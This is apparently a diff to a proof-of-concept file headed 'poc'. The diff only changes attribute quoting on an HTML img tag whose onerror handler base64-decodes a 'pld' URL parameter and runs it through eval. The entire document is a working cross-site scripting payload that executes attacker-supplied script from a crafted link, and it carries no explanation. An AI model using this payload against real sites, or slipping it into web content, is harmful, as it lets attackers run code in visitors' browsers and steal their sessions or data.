@@ -1,3 +1,3 @@
 # poc
 
-<img src=/fizzbuzz onerror=eval(atob((new URL(location)).searchParams.get('pld'))) />
+<img src="/fizzbuzz" onerror="eval(atob((new URL(location)).searchParams.get('pld')))" />
